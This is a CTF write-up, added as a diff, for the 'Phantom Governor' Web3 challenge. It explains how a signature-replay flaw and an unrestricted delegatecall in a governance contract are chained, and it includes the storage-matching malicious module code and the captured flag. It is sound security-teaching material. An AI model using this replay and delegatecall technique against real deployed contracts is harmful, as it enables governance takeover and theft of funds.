@@ -1,0 +1,90 @@
+---
+title: "Phantom Governor"
+description: "A governance smart contract on Sepolia. The goal is to become a council member by reaching a power level of at least 900 and calling joinCouncil(), then claiming the flag on the CTF website."
+date: 2026-02-13T12:27:00.000Z
+tags: ["ctf", "web3", "adabyron"]
+ctf: "Cátedra Ada Byron UAH (INCIBE)"
+category: "Web3"
+---
+
+**CTF:** Cátedra Ada Byron UAH (INCIBE)  
+**Category:** Web3  
+**Difficulty:** 350
+
+## Challenge
+
+A governance smart contract on Sepolia. The goal is to become a council member by reaching a power level of at least 900 and calling `joinCouncil()`, then claiming the flag on the CTF website.
+
+## Contract Analysis
+
+```solidity
+function authorize(address user, uint256 deadline, bytes calldata signature) external {
+    if (block.timestamp > deadline) {
+        revert PhantomGovernorExpiredSignature();
+    }
+    bytes32 digest = keccak256(abi.encodePacked("PHANTOM_AUTH", user, deadline));
+    address recovered = _recoverSigner(digest, signature);
+    if (recovered != signer) {
+        revert PhantomGovernorInvalidSignature();
+    }
+    canExecute[msg.sender] = true;
+}
+```
+
+**Vulnerability 1 — Replay attack on `authorize`.** The contract checks the signature and deadline, but never records that a signature has been used. No nonce, no mapping of used signatures. This means any valid signature can be replayed indefinitely as long as the deadline hasn't expired. Even better: the `canExecute` is set for `msg.sender`, not for the `user` in the signature — so anyone can reuse someone else's valid signature to authorize themselves.
+
+```solidity
+function run(bytes calldata data) external {
+    if (!canExecute[msg.sender]) {
+        revert PhantomGovernorUnauthorized();
+    }
+    (bool ok, ) = module.delegatecall(data);
+    if (!ok) { revert PhantomGovernorRunFailed(); }
+}
+```
+
+**Vulnerability 2 — Unrestricted `delegatecall`.** Once authorized, you can set any module and run arbitrary code via `delegatecall` in the contract's storage context.
+
+## Solution
+
+### Step 1 — Replay attack to get authorization
+
+Found a previous successful `authorize` transaction on Etherscan and extracted the parameters: `user`, `deadline`, and `signature`. Called `authorize` with those exact same values — since there's no nonce protection, the contract accepted it and set `canExecute[myAddress] = true`.
+
+### Step 2 — Deploy the malicious module
+
+Created a contract that mirrors `PhantomGovernor`'s storage layout exactly (this is critical for `delegatecall`) and adds a single function:
+
+```solidity
+contract MaliciousModule {
+    // Storage layout must match PhantomGovernor exactly
+    address public owner;                            // slot 0
+    address public signer;                           // slot 1
+    address public module;                           // slot 2
+    uint256 public minPower;                         // slot 3
+    mapping(address => bool) public canExecute;      // slot 4
+    mapping(address => uint256) public power;        // slot 5
+    mapping(address => bool) public isCouncilMember; // slot 6
+    address[] private councilMembers;                // slot 7
+
+    function setPower() external {
+        power[msg.sender] = 1000;
+    }
+}
+```
+
+When called via `delegatecall`, `setPower` writes to `PhantomGovernor`'s storage slot 5, setting our power to 1000.
+
+### Step 3 — Swap module and escalate
+
+Called `setModule` pointing to the malicious contract, then called `run` with the `setPower()` selector (`0xcc61c5a7`). The `delegatecall` executed in `PhantomGovernor`'s context, writing 1000 to our power.
+
+### Step 4 — Join the council and claim
+
+Called `joinCouncil()` — with power at 1000 (above the 900 threshold), we're added to the council. Connected the wallet on the CTF website and hit "Claim award".
+
+Flag: `flag{OTHstUqyT4BRgaDDPFqHfQ3PjfCydyJE}`
+
+## Takeaway
+
+Two classic Web3 vulnerabilities chained together. First, signature-based authorization without nonce protection enables replay attacks — any past valid signature becomes a universal key. This is exactly why EIP-712 exists and why signatures should always include a nonce that gets marked as used. Second, `delegatecall` with user-controlled modules is essentially giving anyone the ability to rewrite your contract's state. The storage layout matching requirement is the only thing that makes this non-trivial, but it's just a matter of reading the contract's slot assignments.
